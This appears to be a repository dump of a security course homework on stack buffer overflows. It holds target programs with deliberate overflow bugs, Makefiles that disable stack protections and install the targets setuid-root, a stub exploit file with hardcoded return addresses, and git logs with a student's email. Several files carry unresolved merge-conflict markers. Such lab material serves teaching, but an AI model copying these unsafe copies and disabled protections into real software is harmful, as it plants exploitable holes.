>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
<<<<<<< HEAD
  char *args[3];
  char *env[1];

  char buf[24];
  printf("Buffer created\n");

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  // Replace these with the correct offsets and addresses
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;
  printf("Buffer populated with addresses\n");

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  printf("Calling execve with target: %s\n", TARGET);
=======
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<<<<<<< HEAD
=======



>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<<<<<<< HEAD
<START OF ./.git/config>
=======
<START OF ./cs5435-hw4/.git/config>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
<<<<<<< HEAD
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
=======
	url = https://github.com/cs5435/cs5435-hw4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
[branch "master"]
	remote = origin
	merge = refs/heads/master

<<<<<<< HEAD
<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/master

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
may 5 v5

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
=======
<END OF ./cs5435-hw4/.git/config>
<START OF ./cs5435-hw4/.git/HEAD>
ref: refs/heads/master

<END OF ./cs5435-hw4/.git/HEAD>
<START OF ./cs5435-hw4/.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./cs5435-hw4/.git/description>
<START OF ./cs5435-hw4/.git/packed-refs>
# pack-refs with: peeled fully-peeled sorted 
df3e909cf32de4118129cbdd47846a73eeb2c36c refs/remotes/origin/master

<END OF ./cs5435-hw4/.git/packed-refs>
<START OF ./cs5435-hw4/.git/info/exclude>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<<<<<<< HEAD
<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	checkout: moving from main to master
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2
4861122ff0358bef3a46545443aa5146e2400256 a4e8572ff87729cff56463192c53e48422d10a23 justinhalford <justinhalford@gmail.com> 1714702484 -0400	commit: may 2 v3
a4e8572ff87729cff56463192c53e48422d10a23 89be593cf6db74dd63ff2e9c1a6a9d7d2702298d justinhalford <justinhalford@gmail.com> 1714702859 -0400	commit: may 2 v4
89be593cf6db74dd63ff2e9c1a6a9d7d2702298d d223c0f2b9a5e40623a89849ae396e08eb4d13fd justinhalford <justinhalford@gmail.com> 1714703179 -0400	commit: may 2 v5
d223c0f2b9a5e40623a89849ae396e08eb4d13fd b9aa4c0de12028e643a9758cacf0b086987d2f84 justinhalford <justinhalford@gmail.com> 1714703559 -0400	commit: may 2 v5
b9aa4c0de12028e643a9758cacf0b086987d2f84 05d56abea2a2a7f56d4aaa357853bfe483ade885 justinhalford <justinhalford@gmail.com> 1714703659 -0400	commit: may 2 v5
05d56abea2a2a7f56d4aaa357853bfe483ade885 ea659915f456ea54f35951014c606b25ff36136c justinhalford <justinhalford@gmail.com> 1714704235 -0400	commit: may 2 v5
ea659915f456ea54f35951014c606b25ff36136c 4b03e37d56be2acd9bd9edb328420ee2aad4aeec justinhalford <justinhalford@gmail.com> 1714704381 -0400	commit: may 2 v5
4b03e37d56be2acd9bd9edb328420ee2aad4aeec e01db5723b9754927d340122ff533f6f757e844f justinhalford <justinhalford@gmail.com> 1714704423 -0400	commit: may 2 v5
e01db5723b9754927d340122ff533f6f757e844f 19063b74803dc4d276d729349db9e4d792cfba7b justinhalford <justinhalford@gmail.com> 1714704743 -0400	commit: may 2 v5
19063b74803dc4d276d729349db9e4d792cfba7b 4a89f2a7ce0528565a4b9a874006b863d89e6836 justinhalford <justinhalford@gmail.com> 1714704801 -0400	commit: may 2 v5
4a89f2a7ce0528565a4b9a874006b863d89e6836 516e43d66cdd3be206b20e635d4549249cb247aa justinhalford <justinhalford@gmail.com> 1714705087 -0400	commit: may 2 v5
516e43d66cdd3be206b20e635d4549249cb247aa 336fb9fc5db2141a6d48744b560f00e3eadb1b53 justinhalford <justinhalford@gmail.com> 1714705532 -0400	commit: may 2 v5
336fb9fc5db2141a6d48744b560f00e3eadb1b53 bff39acce501732b55069db49c60e195684eba22 justinhalford <justinhalford@gmail.com> 1714950582 -0400	commit: may 2 v5
bff39acce501732b55069db49c60e195684eba22 504c73a4bc1de696143b9a373676ac0d2bb4416a justinhalford <justinhalford@gmail.com> 1714950799 -0400	commit: may 5 v5
504c73a4bc1de696143b9a373676ac0d2bb4416a d880e67c90479e2b5395757768f8f69e4f6f1419 justinhalford <justinhalford@gmail.com> 1714950848 -0400	commit: may 5 v5
d880e67c90479e2b5395757768f8f69e4f6f1419 8b70d41fbec1b342946d02aae1d814276bd4d106 justinhalford <justinhalford@gmail.com> 1714950908 -0400	commit: may 5 v5
8b70d41fbec1b342946d02aae1d814276bd4d106 62ccaa1b97e38f0526fac94147c7e3aa6897cd6d justinhalford <justinhalford@gmail.com> 1714951001 -0400	commit: may 5 v5
62ccaa1b97e38f0526fac94147c7e3aa6897cd6d c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec justinhalford <justinhalford@gmail.com> 1714951109 -0400	commit: may 5 v5
c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 justinhalford <justinhalford@gmail.com> 1715014471 -0400	commit: may 5 v5
ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 3ab176cfc2d5344fb0265852dadc22c187f1a219 justinhalford <justinhalford@gmail.com> 1715014787 -0400	commit: may 5 v5
3ab176cfc2d5344fb0265852dadc22c187f1a219 ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 justinhalford <justinhalford@gmail.com> 1715015422 -0400	commit: may 5 v5
ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 77857e6318764f5f9f8930a80586455f87e695a2 justinhalford <justinhalford@gmail.com> 1715015616 -0400	commit: may 5 v5
77857e6318764f5f9f8930a80586455f87e695a2 5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 justinhalford <justinhalford@gmail.com> 1715016442 -0400	commit: may 5 v5
5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 e69e4f07d06807af8a9b328575fafbefd0164919 justinhalford <justinhalford@gmail.com> 1715016531 -0400	commit: may 5 v5
e69e4f07d06807af8a9b328575fafbefd0164919 be661a53accefcad2a4ccf683759860a7c0e83cf justinhalford <justinhalford@gmail.com> 1715016689 -0400	commit: may 5 v5
be661a53accefcad2a4ccf683759860a7c0e83cf 0ead936ebafd7795a40e11511f3c87d7b3e2c0bb justinhalford <justinhalford@gmail.com> 1715019567 -0400	commit: may 5 v5
0ead936ebafd7795a40e11511f3c87d7b3e2c0bb 8866a60015970bbf8cc7a884487e030428bb666d justinhalford <justinhalford@gmail.com> 1715021265 -0400	commit: may 5 v5
8866a60015970bbf8cc7a884487e030428bb666d c575aedc80a89c74617fe4043901019959b436ee justinhalford <justinhalford@gmail.com> 1715021729 -0400	commit: may 5 v5
c575aedc80a89c74617fe4043901019959b436ee d6d9ca779038a7bcf8e6ecea0d80417979614157 justinhalford <justinhalford@gmail.com> 1715023571 -0400	commit: may 5 v5
d6d9ca779038a7bcf8e6ecea0d80417979614157 f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 justinhalford <justinhalford@gmail.com> 1715024033 -0400	commit: may 5 v5
f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 75ea162102c5fc3d80b5eefc5b6a1f67243158a9 justinhalford <justinhalford@gmail.com> 1715024055 -0400	commit: may 5 v5
75ea162102c5fc3d80b5eefc5b6a1f67243158a9 dd60aad429ef623ef5c854d1ac3f70cb756a5263 justinhalford <justinhalford@gmail.com> 1715024083 -0400	commit: may 5 v5
dd60aad429ef623ef5c854d1ac3f70cb756a5263 20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 justinhalford <justinhalford@gmail.com> 1715024298 -0400	commit: may 5 v5
20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 5e35e7014c44c0918edf9ee8ddecf50852639cb1 justinhalford <justinhalford@gmail.com> 1715025384 -0400	commit: may 5 v5
5e35e7014c44c0918edf9ee8ddecf50852639cb1 aa4953b5c0e5027e2b75c51a124dd26dda50cb52 justinhalford <justinhalford@gmail.com> 1715026918 -0400	commit: may 5 v5
aa4953b5c0e5027e2b75c51a124dd26dda50cb52 a34b1b99ba7376912bf8ff020ee241a9bee01e96 justinhalford <justinhalford@gmail.com> 1715030531 -0400	commit: may 5 v5
a34b1b99ba7376912bf8ff020ee241a9bee01e96 5191deaeac129aae17f44ea21eabee45374b5f46 justinhalford <justinhalford@gmail.com> 1715030769 -0400	commit: may 5 v5
5191deaeac129aae17f44ea21eabee45374b5f46 f505801a479543ea8c9900f8999dcfbc74fdce55 justinhalford <justinhalford@gmail.com> 1715031383 -0400	commit: may 5 v5
f505801a479543ea8c9900f8999dcfbc74fdce55 9852249ec46a55efc57f79d9c61b6b2b8c741894 justinhalford <justinhalford@gmail.com> 1715031502 -0400	commit: may 5 v5
9852249ec46a55efc57f79d9c61b6b2b8c741894 a6339781ec9385ea94f7f7e098b73ee2776c5cf9 justinhalford <justinhalford@gmail.com> 1715031566 -0400	commit: may 5 v5

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/master>
0000000000000000000000000000000000000000 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	branch: Created from HEAD
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2
4861122ff0358bef3a46545443aa5146e2400256 a4e8572ff87729cff56463192c53e48422d10a23 justinhalford <justinhalford@gmail.com> 1714702484 -0400	commit: may 2 v3
a4e8572ff87729cff56463192c53e48422d10a23 89be593cf6db74dd63ff2e9c1a6a9d7d2702298d justinhalford <justinhalford@gmail.com> 1714702859 -0400	commit: may 2 v4
89be593cf6db74dd63ff2e9c1a6a9d7d2702298d d223c0f2b9a5e40623a89849ae396e08eb4d13fd justinhalford <justinhalford@gmail.com> 1714703179 -0400	commit: may 2 v5
d223c0f2b9a5e40623a89849ae396e08eb4d13fd b9aa4c0de12028e643a9758cacf0b086987d2f84 justinhalford <justinhalford@gmail.com> 1714703559 -0400	commit: may 2 v5
b9aa4c0de12028e643a9758cacf0b086987d2f84 05d56abea2a2a7f56d4aaa357853bfe483ade885 justinhalford <justinhalford@gmail.com> 1714703659 -0400	commit: may 2 v5
05d56abea2a2a7f56d4aaa357853bfe483ade885 ea659915f456ea54f35951014c606b25ff36136c justinhalford <justinhalford@gmail.com> 1714704235 -0400	commit: may 2 v5
ea659915f456ea54f35951014c606b25ff36136c 4b03e37d56be2acd9bd9edb328420ee2aad4aeec justinhalford <justinhalford@gmail.com> 1714704381 -0400	commit: may 2 v5
4b03e37d56be2acd9bd9edb328420ee2aad4aeec e01db5723b9754927d340122ff533f6f757e844f justinhalford <justinhalford@gmail.com> 1714704423 -0400	commit: may 2 v5
e01db5723b9754927d340122ff533f6f757e844f 19063b74803dc4d276d729349db9e4d792cfba7b justinhalford <justinhalford@gmail.com> 1714704743 -0400	commit: may 2 v5
19063b74803dc4d276d729349db9e4d792cfba7b 4a89f2a7ce0528565a4b9a874006b863d89e6836 justinhalford <justinhalford@gmail.com> 1714704801 -0400	commit: may 2 v5
4a89f2a7ce0528565a4b9a874006b863d89e6836 516e43d66cdd3be206b20e635d4549249cb247aa justinhalford <justinhalford@gmail.com> 1714705087 -0400	commit: may 2 v5
516e43d66cdd3be206b20e635d4549249cb247aa 336fb9fc5db2141a6d48744b560f00e3eadb1b53 justinhalford <justinhalford@gmail.com> 1714705532 -0400	commit: may 2 v5
336fb9fc5db2141a6d48744b560f00e3eadb1b53 bff39acce501732b55069db49c60e195684eba22 justinhalford <justinhalford@gmail.com> 1714950582 -0400	commit: may 2 v5
bff39acce501732b55069db49c60e195684eba22 504c73a4bc1de696143b9a373676ac0d2bb4416a justinhalford <justinhalford@gmail.com> 1714950799 -0400	commit: may 5 v5
504c73a4bc1de696143b9a373676ac0d2bb4416a d880e67c90479e2b5395757768f8f69e4f6f1419 justinhalford <justinhalford@gmail.com> 1714950848 -0400	commit: may 5 v5
d880e67c90479e2b5395757768f8f69e4f6f1419 8b70d41fbec1b342946d02aae1d814276bd4d106 justinhalford <justinhalford@gmail.com> 1714950908 -0400	commit: may 5 v5
8b70d41fbec1b342946d02aae1d814276bd4d106 62ccaa1b97e38f0526fac94147c7e3aa6897cd6d justinhalford <justinhalford@gmail.com> 1714951001 -0400	commit: may 5 v5
62ccaa1b97e38f0526fac94147c7e3aa6897cd6d c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec justinhalford <justinhalford@gmail.com> 1714951109 -0400	commit: may 5 v5
c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 justinhalford <justinhalford@gmail.com> 1715014471 -0400	commit: may 5 v5
ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 3ab176cfc2d5344fb0265852dadc22c187f1a219 justinhalford <justinhalford@gmail.com> 1715014787 -0400	commit: may 5 v5
3ab176cfc2d5344fb0265852dadc22c187f1a219 ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 justinhalford <justinhalford@gmail.com> 1715015422 -0400	commit: may 5 v5
ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 77857e6318764f5f9f8930a80586455f87e695a2 justinhalford <justinhalford@gmail.com> 1715015616 -0400	commit: may 5 v5
77857e6318764f5f9f8930a80586455f87e695a2 5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 justinhalford <justinhalford@gmail.com> 1715016442 -0400	commit: may 5 v5
5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 e69e4f07d06807af8a9b328575fafbefd0164919 justinhalford <justinhalford@gmail.com> 1715016531 -0400	commit: may 5 v5
e69e4f07d06807af8a9b328575fafbefd0164919 be661a53accefcad2a4ccf683759860a7c0e83cf justinhalford <justinhalford@gmail.com> 1715016689 -0400	commit: may 5 v5
be661a53accefcad2a4ccf683759860a7c0e83cf 0ead936ebafd7795a40e11511f3c87d7b3e2c0bb justinhalford <justinhalford@gmail.com> 1715019567 -0400	commit: may 5 v5
0ead936ebafd7795a40e11511f3c87d7b3e2c0bb 8866a60015970bbf8cc7a884487e030428bb666d justinhalford <justinhalford@gmail.com> 1715021265 -0400	commit: may 5 v5
8866a60015970bbf8cc7a884487e030428bb666d c575aedc80a89c74617fe4043901019959b436ee justinhalford <justinhalford@gmail.com> 1715021729 -0400	commit: may 5 v5
c575aedc80a89c74617fe4043901019959b436ee d6d9ca779038a7bcf8e6ecea0d80417979614157 justinhalford <justinhalford@gmail.com> 1715023571 -0400	commit: may 5 v5
d6d9ca779038a7bcf8e6ecea0d80417979614157 f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 justinhalford <justinhalford@gmail.com> 1715024033 -0400	commit: may 5 v5
f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 75ea162102c5fc3d80b5eefc5b6a1f67243158a9 justinhalford <justinhalford@gmail.com> 1715024055 -0400	commit: may 5 v5
75ea162102c5fc3d80b5eefc5b6a1f67243158a9 dd60aad429ef623ef5c854d1ac3f70cb756a5263 justinhalford <justinhalford@gmail.com> 1715024083 -0400	commit: may 5 v5
dd60aad429ef623ef5c854d1ac3f70cb756a5263 20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 justinhalford <justinhalford@gmail.com> 1715024298 -0400	commit: may 5 v5
20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 5e35e7014c44c0918edf9ee8ddecf50852639cb1 justinhalford <justinhalford@gmail.com> 1715025384 -0400	commit: may 5 v5
5e35e7014c44c0918edf9ee8ddecf50852639cb1 aa4953b5c0e5027e2b75c51a124dd26dda50cb52 justinhalford <justinhalford@gmail.com> 1715026918 -0400	commit: may 5 v5
aa4953b5c0e5027e2b75c51a124dd26dda50cb52 a34b1b99ba7376912bf8ff020ee241a9bee01e96 justinhalford <justinhalford@gmail.com> 1715030531 -0400	commit: may 5 v5
a34b1b99ba7376912bf8ff020ee241a9bee01e96 5191deaeac129aae17f44ea21eabee45374b5f46 justinhalford <justinhalford@gmail.com> 1715030769 -0400	commit: may 5 v5
5191deaeac129aae17f44ea21eabee45374b5f46 f505801a479543ea8c9900f8999dcfbc74fdce55 justinhalford <justinhalford@gmail.com> 1715031383 -0400	commit: may 5 v5
f505801a479543ea8c9900f8999dcfbc74fdce55 9852249ec46a55efc57f79d9c61b6b2b8c741894 justinhalford <justinhalford@gmail.com> 1715031502 -0400	commit: may 5 v5
9852249ec46a55efc57f79d9c61b6b2b8c741894 a6339781ec9385ea94f7f7e098b73ee2776c5cf9 justinhalford <justinhalford@gmail.com> 1715031566 -0400	commit: may 5 v5

<END OF ./.git/logs/refs/heads/master>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701559 -0400	update by push
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701936 -0400	update by push
4861122ff0358bef3a46545443aa5146e2400256 a4e8572ff87729cff56463192c53e48422d10a23 justinhalford <justinhalford@gmail.com> 1714702488 -0400	update by push
a4e8572ff87729cff56463192c53e48422d10a23 89be593cf6db74dd63ff2e9c1a6a9d7d2702298d justinhalford <justinhalford@gmail.com> 1714702862 -0400	update by push
89be593cf6db74dd63ff2e9c1a6a9d7d2702298d d223c0f2b9a5e40623a89849ae396e08eb4d13fd justinhalford <justinhalford@gmail.com> 1714703181 -0400	update by push
d223c0f2b9a5e40623a89849ae396e08eb4d13fd b9aa4c0de12028e643a9758cacf0b086987d2f84 justinhalford <justinhalford@gmail.com> 1714703562 -0400	update by push
b9aa4c0de12028e643a9758cacf0b086987d2f84 05d56abea2a2a7f56d4aaa357853bfe483ade885 justinhalford <justinhalford@gmail.com> 1714703661 -0400	update by push
05d56abea2a2a7f56d4aaa357853bfe483ade885 ea659915f456ea54f35951014c606b25ff36136c justinhalford <justinhalford@gmail.com> 1714704236 -0400	update by push
ea659915f456ea54f35951014c606b25ff36136c 4b03e37d56be2acd9bd9edb328420ee2aad4aeec justinhalford <justinhalford@gmail.com> 1714704382 -0400	update by push
4b03e37d56be2acd9bd9edb328420ee2aad4aeec e01db5723b9754927d340122ff533f6f757e844f justinhalford <justinhalford@gmail.com> 1714704424 -0400	update by push
e01db5723b9754927d340122ff533f6f757e844f 19063b74803dc4d276d729349db9e4d792cfba7b justinhalford <justinhalford@gmail.com> 1714704744 -0400	update by push
19063b74803dc4d276d729349db9e4d792cfba7b 4a89f2a7ce0528565a4b9a874006b863d89e6836 justinhalford <justinhalford@gmail.com> 1714704801 -0400	update by push
4a89f2a7ce0528565a4b9a874006b863d89e6836 516e43d66cdd3be206b20e635d4549249cb247aa justinhalford <justinhalford@gmail.com> 1714705087 -0400	update by push
516e43d66cdd3be206b20e635d4549249cb247aa 336fb9fc5db2141a6d48744b560f00e3eadb1b53 justinhalford <justinhalford@gmail.com> 1714705533 -0400	update by push
336fb9fc5db2141a6d48744b560f00e3eadb1b53 bff39acce501732b55069db49c60e195684eba22 justinhalford <justinhalford@gmail.com> 1714950583 -0400	update by push
bff39acce501732b55069db49c60e195684eba22 504c73a4bc1de696143b9a373676ac0d2bb4416a justinhalford <justinhalford@gmail.com> 1714950799 -0400	update by push
504c73a4bc1de696143b9a373676ac0d2bb4416a d880e67c90479e2b5395757768f8f69e4f6f1419 justinhalford <justinhalford@gmail.com> 1714950849 -0400	update by push
d880e67c90479e2b5395757768f8f69e4f6f1419 8b70d41fbec1b342946d02aae1d814276bd4d106 justinhalford <justinhalford@gmail.com> 1714950909 -0400	update by push
8b70d41fbec1b342946d02aae1d814276bd4d106 62ccaa1b97e38f0526fac94147c7e3aa6897cd6d justinhalford <justinhalford@gmail.com> 1714951002 -0400	update by push
62ccaa1b97e38f0526fac94147c7e3aa6897cd6d c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec justinhalford <justinhalford@gmail.com> 1714951110 -0400	update by push
c121ff9eb0d842860a54a8c0b6e6670a9a64b1ec ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 justinhalford <justinhalford@gmail.com> 1715014472 -0400	update by push
ad9c2b0b2d59ce5d891492f5a112ce9e700b4353 3ab176cfc2d5344fb0265852dadc22c187f1a219 justinhalford <justinhalford@gmail.com> 1715014788 -0400	update by push
3ab176cfc2d5344fb0265852dadc22c187f1a219 ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 justinhalford <justinhalford@gmail.com> 1715015423 -0400	update by push
ab86319c3821b07da066a4c3d2ae8d21cb7ca7e3 77857e6318764f5f9f8930a80586455f87e695a2 justinhalford <justinhalford@gmail.com> 1715015617 -0400	update by push
77857e6318764f5f9f8930a80586455f87e695a2 5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 justinhalford <justinhalford@gmail.com> 1715016443 -0400	update by push
